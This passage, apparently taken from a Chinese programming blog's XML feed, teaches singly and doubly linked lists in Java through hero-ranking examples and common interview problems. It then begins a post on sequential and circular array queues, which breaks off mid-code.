class="line"><span class="keyword">package</span> com.nanzx.linkedlist;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SingleLinkedListDemo</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">// 先创建节点</span></span><br><span class="line"><span class="type">HeroNode</span> <span class="variable">hero1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HeroNode</span>(<span class="number">1</span>, <span class="string">&quot;宋江&quot;</span>, <span class="string">&quot;及时雨&quot;</span>);</span><br><span class="line"><span class="type">HeroNode</span> <span class="variable">hero2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HeroNode</span>(<span class="number">2</span>, <span class="string">&quot;卢俊义&quot;</span>, <span class="string">&quot;玉麒麟&quot;</span>);</span><br><span class="line"><span class="type">HeroNode</span> <span class="variable">hero3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HeroNode</span>(<span class="number">3</span>, <span class="string">&quot;吴用&quot;</span>, <span class="string">&quot;智多星&quot;</span>);</span><br><span class="line"><span class="type">HeroNode</span> <span class="variable">hero4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HeroNode</span>(<span class="number">4</span>, <span class="string">&quot;林冲&quot;</span>, <span class="string">&quot;豹子头&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建管理链表</span></span><br><span class="line"><span class="type">SingleLinkedList</span> <span class="variable">singleLinkedList</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SingleLinkedList</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 链表尾部加入</span></span><br><span class="line"><span class="comment">//singleLinkedList.add(hero1);</span></span><br><span class="line"><span class="comment">//singleLinkedList.add(hero4);</span></span><br><span class="line"><span class="comment">//singleLinkedList.add(hero2);</span></span><br><span class="line"><span class="comment">//singleLinkedList.add(hero3);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 按编号的顺序加入</span></span><br><span class="line">singleLinkedList.addByOrder(hero1);</span><br><span class="line">singleLinkedList.addByOrder(hero4);</span><br><span class="line">singleLinkedList.addByOrder(hero2);</span><br><span class="line">singleLinkedList.addByOrder(hero3);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试修改节点的代码</span></span><br><span class="line"><span class="comment">//HeroNode newHeroNode = new HeroNode(2, &quot;小卢&quot;, &quot;玉麒麟~~&quot;);</span></span><br><span class="line"><span class="comment">//singleLinkedList.update(newHeroNode);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试删除节点的代码</span></span><br><span class="line"><span class="comment">//singleLinkedList.del(1);</span></span><br><span class="line"><span class="comment">//singleLinkedList.del(4);</span></span><br><span class="line"></span><br><span class="line"> singleLinkedList.list();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="单向链表面试题"><a href="#单向链表面试题" class="headerlink" title="单向链表面试题"></a>单向链表面试题</h1><h2 id="获取到单向链表节点的个数"><a href="#获取到单向链表节点的个数" class="headerlink" title="获取到单向链表节点的个数"></a>获取到单向链表节点的个数</h2><p>要求：如果是带头节点的链表，不统计头节点</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">// 方法：获取到单链表的节点的个数(如果是带头结点的链表，需求不统计头节点)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getLenth</span><span class="params">(HeroNode head)</span> &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="type">HeroNode</span> <span class="variable">cur</span> <span class="operator">=</span> head.next;</span><br><span class="line"><span class="keyword">while</span> (cur != <span class="literal">null</span>) &#123;</span><br><span class="line">length++;</span><br><span class="line">cur = cur.next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="查找单向链表中的倒数第k个结点-【新浪面试题】"><a href="#查找单向链表中的倒数第k个结点-【新浪面试题】" class="headerlink" title="查找单向链表中的倒数第k个结点 【新浪面试题】"></a>查找单向链表中的倒数第k个结点 【新浪面试题】</h2><p>思路：</p><blockquote><ol><li>编写一个方法，接收head节点，同时接收一个index</li><li>index 表示是倒数第index个节点</li><li>先把链表从头到尾遍历，得到链表的总的长度 size&#x3D;getLenth</li><li>得到size 后，我们从链表的第一个非头结点开始遍历 (size-index)个</li><li>如果找到了，则返回该节点，否则返回nulll</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> HeroNode <span class="title function_">findLastIndexNode</span><span class="params">(HeroNode head, <span class="type">int</span> index)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (head.next == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> getLenth(head);</span><br><span class="line"><span class="comment">// 先做一个index的校验</span></span><br><span class="line"><span class="keyword">if</span> (index &lt;= <span class="number">0</span> || index &gt; size) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 定义给辅助变量， for 循环定位到倒数的index</span></span><br><span class="line"><span class="type">HeroNode</span> <span class="variable">cur</span> <span class="operator">=</span> head.next;  </span><br><span class="line">    <span class="comment">// 例如：size4-index2=2，cur只需移动2步就可以得到结果</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size - index; i++) &#123;</span><br><span class="line">cur = cur.next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> cur;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="实现单向链表的反转【腾讯面试题】"><a href="#实现单向链表的反转【腾讯面试题】" class="headerlink" title="实现单向链表的反转【腾讯面试题】"></a>实现单向链表的反转【腾讯面试题】</h2><p>方法：<strong>头插法</strong></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215702.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">reversetList</span><span class="params">(HeroNode head)</span> &#123;</span><br><span class="line"><span class="comment">// 如果当前链表为空，或者只有一个节点，无需反转，直接返回</span></span><br><span class="line"><span class="keyword">if</span> (head.next == <span class="literal">null</span> || head.next.next == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">HeroNode</span> <span class="variable">cur</span> <span class="operator">=</span> head.next;</span><br><span class="line"><span class="type">HeroNode</span> <span class="variable">next</span> <span class="operator">=</span> <span class="literal">null</span>;<span class="comment">// 指向当前节点[cur]的下一个节点</span></span><br><span class="line"><span class="type">HeroNode</span> <span class="variable">reverseHead</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HeroNode</span>(<span class="number">0</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="comment">// 遍历原来的链表，每遍历一个节点，就将其取出，并放在新的链表reverseHead 的最前端</span></span><br><span class="line"><span class="keyword">while</span> (cur != <span class="literal">null</span>) &#123;</span><br><span class="line">next = cur.next;<span class="comment">// 先暂时保存当前节点的下一个节点，因为后面需要使用</span></span><br><span class="line">cur.next = reverseHead.next;<span class="comment">// 将cur的下一个节点指向新的链表的最前端</span></span><br><span class="line">reverseHead.next = cur; <span class="comment">// 将cur 连接到新的链表上</span></span><br><span class="line">cur = next;<span class="comment">// 让cur后移</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将head.next 指向 reverseHead.next , 实现单链表的反转</span></span><br><span class="line">head.next = reverseHead.next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="从尾到头打印单向链表【百度面试题】"><a href="#从尾到头打印单向链表【百度面试题】" class="headerlink" title="从尾到头打印单向链表【百度面试题】"></a>从尾到头打印单向链表【百度面试题】</h2><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215703.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 可以利用栈这个数据结构，将各个节点压入到栈中，然后利用栈的先进后出的特点，就实现了逆序打印的效果</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">reversePrint</span><span class="params">(HeroNode head)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (head.next == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span>;<span class="comment">// 空链表，不能打印</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 创建要给一个栈，将各个节点压入栈</span></span><br><span class="line">Stack&lt;HeroNode&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;HeroNode&gt;();</span><br><span class="line"><span class="type">HeroNode</span> <span class="variable">cur</span> <span class="operator">=</span> head.next;</span><br><span class="line"><span class="comment">// 将链表的所有节点压入栈</span></span><br><span class="line"><span class="keyword">while</span> (cur != <span class="literal">null</span>) &#123;</span><br><span class="line">stack.push(cur);</span><br><span class="line">cur = cur.next; <span class="comment">// cur后移，这样就可以压入下一个节点</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将栈中的节点进行打印,pop 出栈</span></span><br><span class="line"><span class="keyword">while</span> (stack.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">System.out.println(stack.pop()); <span class="comment">// stack的特点是先进后出</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="双向链表的应用实例"><a href="#双向链表的应用实例" class="headerlink" title="双向链表的应用实例"></a>双向链表的应用实例</h1><p>使用带头结点的双向链表，实现水浒英雄排行榜对英雄人物的增删改查操作。</p><hr><h2 id="管理单向链表的缺点分析："><a href="#管理单向链表的缺点分析：" class="headerlink" title="管理单向链表的缺点分析："></a>管理单向链表的缺点分析：</h2><blockquote><ol><li><p>单向链表，查找的方向只能是一个方向，而双向链表可以向前或者向后查找。</p></li><li><p>单向链表不能自我删除，需要靠辅助节点，而双向链表，则可以自我删除，所以前面我们单向链表删除时节点，总是找到temp，temp是待删除节点的前一个节点。</p></li></ol></blockquote><hr><h2 id="分析双向链表的遍历，添加，修改，删除的操作思路"><a href="#分析双向链表的遍历，添加，修改，删除的操作思路" class="headerlink" title="分析双向链表的遍历，添加，修改，删除的操作思路:"></a>分析双向链表的遍历，添加，修改，删除的操作思路:</h2><blockquote><ol><li><p>遍历方法和单向链表一样，只是可以向前，也可以向后查找。</p></li><li><p>添加（默认添加到双向链表的最后）：</p></li></ol><ul><li>先找到双向链表的最后这个节点</li><li>temp.next&#x3D;newHeroNode；</li><li>newHeroNode.pre&#x3D;temp；</li></ul><ol start="3"><li><p>修改思路和原来的单向链表一样。</p></li><li><p>删除：</p></li></ol><ul><li><p>因为是双向链表，因此，我们可以实现自我删除某个节点</p></li><li><p>直接找到要删除的这个节点，比如temp</p></li><li><p>temp.pre.next&#x3D;temp.next；</p></li><li><p>temp.next.pre&#x3D;temp.pre；</p></li></ul></blockquote><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.linkedlist;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DoubleLinkedListDemo</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line"><span class="comment">// 进行测试</span></span><br><span class="line"><span class="comment">// 先创建节点</span></span><br><span class="line"><span class="type">HeroNode2</span> <span class="variable">hero1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HeroNode2</span>(<span class="number">1</span>, <span class="string">&quot;宋江&quot;</span>, <span class="string">&quot;及时雨&quot;</span>);</span><br><span class="line"><span class="type">HeroNode2</span> <span class="variable">hero2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HeroNode2</span>(<span class="number">2</span>, <span class="string">&quot;卢俊义&quot;</span>, <span class="string">&quot;玉麒麟&quot;</span>);</span><br><span class="line"><span class="type">HeroNode2</span> <span class="variable">hero3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HeroNode2</span>(<span class="number">3</span>, <span class="string">&quot;吴用&quot;</span>, <span class="string">&quot;智多星&quot;</span>);</span><br><span class="line"><span class="type">HeroNode2</span> <span class="variable">hero4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HeroNode2</span>(<span class="number">4</span>, <span class="string">&quot;林冲&quot;</span>, <span class="string">&quot;豹子头&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建管理链表</span></span><br><span class="line"><span class="type">DoubleLinkedList</span> <span class="variable">doubleLinkedList</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DoubleLinkedList</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 最后加入</span></span><br><span class="line">doubleLinkedList.add(hero1);</span><br><span class="line">doubleLinkedList.add(hero4);</span><br><span class="line">doubleLinkedList.add(hero2);</span><br><span class="line">doubleLinkedList.add(hero3);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试修改节点的代码</span></span><br><span class="line"><span class="comment">//HeroNode2 newHeroNode = new HeroNode2(1, &quot;小卢&quot;, &quot;玉麒麟~~&quot;);</span></span><br><span class="line"><span class="comment">//doubleLinkedList.update(newHeroNode);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试删除节点的代码</span></span><br><span class="line">doubleLinkedList.del(<span class="number">2</span>);</span><br><span class="line"><span class="comment">//doubleLinkedList.del(4);</span></span><br><span class="line"></span><br><span class="line">doubleLinkedList.list();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DoubleLinkedList</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="type">HeroNode2</span> <span class="variable">head</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HeroNode2</span>(<span class="number">0</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> HeroNode2 <span class="title function_">getHead</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(HeroNode2 heroNode)</span> &#123;</span><br><span class="line"><span class="type">HeroNode2</span> <span class="variable">temp</span> <span class="operator">=</span> head;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (temp.next == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">temp = temp.next;</span><br><span class="line">&#125;</span><br><span class="line">temp.next = heroNode;</span><br><span class="line">heroNode.pre = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">update</span><span class="params">(HeroNode2 newHeroNode)</span> &#123;</span><br><span class="line"><span class="type">HeroNode2</span> <span class="variable">temp</span> <span class="operator">=</span> head.next;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (temp == <span class="literal">null</span>) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;修改失败，没有找到该节点！&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (temp.no == newHeroNode.no) &#123;</span><br><span class="line">temp.name = newHeroNode.name;</span><br><span class="line">temp.nickname = newHeroNode.nickname;</span><br><span class="line">System.out.println(<span class="string">&quot;修改成功：&quot;</span> + temp);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">temp = temp.next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">del</span><span class="params">(<span class="type">int</span> no)</span> &#123;</span><br><span class="line"><span class="type">HeroNode2</span> <span class="variable">temp</span> <span class="operator">=</span> head.next;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (temp == <span class="literal">null</span>) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;找不到该节点，无法删除！&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (temp.no == no) &#123;</span><br><span class="line"><span class="comment">// 判断temp是否为最后一个节点</span></span><br><span class="line"><span class="keyword">if</span> (temp.next != <span class="literal">null</span>) &#123;</span><br><span class="line">temp.next.pre = temp.pre;</span><br><span class="line">&#125;</span><br><span class="line">temp.pre.next = temp.next;</span><br><span class="line">System.out.printf(<span class="string">&quot;编号为 %d 的英雄删除成功!\n&quot;</span>, no);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">temp = temp.next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">list</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (head.next == <span class="literal">null</span>) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;链表为空&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">HeroNode2</span> <span class="variable">temp</span> <span class="operator">=</span> head.next;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="comment">// 输出节点的信息</span></span><br><span class="line">System.out.println(temp);</span><br><span class="line"><span class="keyword">if</span> (temp.next == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将temp后移</span></span><br><span class="line">temp = temp.next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HeroNode2</span> &#123;</span><br><span class="line"><span class="comment">// data域</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> no;</span><br><span class="line"><span class="keyword">public</span> String name;</span><br><span class="line"><span class="keyword">public</span> String nickname;</span><br><span class="line"><span class="comment">// next域</span></span><br><span class="line"><span class="keyword">public</span> HeroNode2 next;</span><br><span class="line"><span class="comment">// pre域</span></span><br><span class="line"><span class="keyword">public</span> HeroNode2 pre;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">HeroNode2</span><span class="params">(<span class="type">int</span> no, String name, String nickname)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.no = no;</span><br><span class="line"><span class="built_in">this</span>.name = name;</span><br><span class="line"><span class="built_in">this</span>.nickname = nickname;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;HeroNode2 [no=&quot;</span> + no + <span class="string">&quot;, name=&quot;</span> + name + <span class="string">&quot;, nickname=&quot;</span> + nickname + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 单向链表 </tag>
            
            <tag> 双向链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>顺序队列和循环队列的数组实现</title>
      <link href="/posts/3ba7/"/>
      <url>/posts/3ba7/</url>
      
        <content type="html"><![CDATA[<h2 id="队列介绍"><a href="#队列介绍" class="headerlink" title="队列介绍"></a>队列介绍</h2><blockquote><p>1）队列是一个有序列表，可以用数组或是链表来实现。<br>2）遵循先入先出的原则。即：先存入队列的数据，要先取出，后存入的要后取出。</p></blockquote><h2 id="顺序队列"><a href="#顺序队列" class="headerlink" title="顺序队列"></a>顺序队列</h2><blockquote><p>顺序队一般会设置两个指针进行管理：front指针指向队列的<strong>第一个</strong>元素，rear指针指向最后一个元素的<strong>下一个位置</strong>，初始值都是<strong>0</strong>。</p><p>每次在队尾插入一个元素是，rear增1；每次在队头删除一个元素时，front增1。当front&#x3D;rear时，队列中没有任何元素，称为空队列。</p></blockquote><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215712.png"></p><p>顺序队列中的溢出现象：</p><blockquote><p>“下溢”现象：当队列为空时，做出队运算产生的溢出现象。“下溢”是正常现象，常用作程序控制转移的条件。</p><p>“真上溢”现象：当队列满时，做进队运算产生空间溢出的现象。“真上溢”是一种出错状态，应设法避免。</p><p>“假上溢”现象：由于入队和出队操作中，头尾指针只增加不减小，致使被删元素的空间永远无法重新利用。当队列中实际的元素个数远远小于向量空间的规模时，也可能由于尾指针已超越向量空间的上界而不能做入队操作。该现象称为”假上溢”现象。</p></blockquote><p>顺序队列的<strong>缺陷</strong>：当rear增加到指向分配的连续空间之外时，队列无法再插入新元素，但这时往往还有大量可用空间未被占用，这些空间是已经出队的队列元素曾经占用过得存储单元。也就是数组使用过一次后就不能再使用了，没有达到复用的效果。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215654.png"></p><p>缺陷的<strong>解决</strong>思路：</p><p>第一种方法：队列元素的出列是在队头，即下标为0的位置，每次出队，队列中的所有元素都得向前移动，以保证队列的队头，也就是下标为0的位置不为空，此时时间复杂度为0（n），如图所示。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215653.png"></p><p>第二种方法：第一种方法每次出队所有元素都要前移，性能有所降低。我们可以设置front指针和rear指针越界（超过数组下标）时，从头开始循环，这就是下面要介绍的循环队列。</p><h2 id="循环队列"><a href="#循环队列" class="headerlink" title="循环队列"></a>循环队列</h2><p><strong>定义：</strong>无论插入或删除，一旦rear指针增1或front指针增1 时超出了所分配的队列空间，就让它指向这片连续空间的起始位置，这种头尾相接的顺序存储结构称为循环队列。</p><p>front指针指向队列的<strong>第一个</strong>元素，rear指针指向最后一个元素的<strong>下一个位置</strong>，初始值都是<strong>0</strong>。</p><p><strong>当front&#x3D;rear时，称为空队列</strong>，如下图：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215657.png"></p><p>那么问题来了，下图再入列a7时，rear&#x3D;front，此时就不是空队列了，与上面矛盾。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215655.png"></p><p>所以当队列满时，我们修改其条件，保留一个元素空间。也就是说，<strong>队列满时，数组中还有一个空闲单元</strong>，如下图就是队列满了：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215656.png"></p><p>数组最大容量为QueueSize，那么<strong>队列满的条件是（rear+1）%QueueSize &#x3D;&#x3D;front</strong>（取模“%”的目的就是为了整合rear与front大小的问题）。如上图所示。</p><p>队列长度分为两段，一段是QueueSize-front，另一段是0+rear，加在一起，队列长度为rear-front+QueueSize。因此通用的计算<strong>队列长度公式为：（rear-front+QueueSize）%QueueSize</strong></p><p>循环队列的代码实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 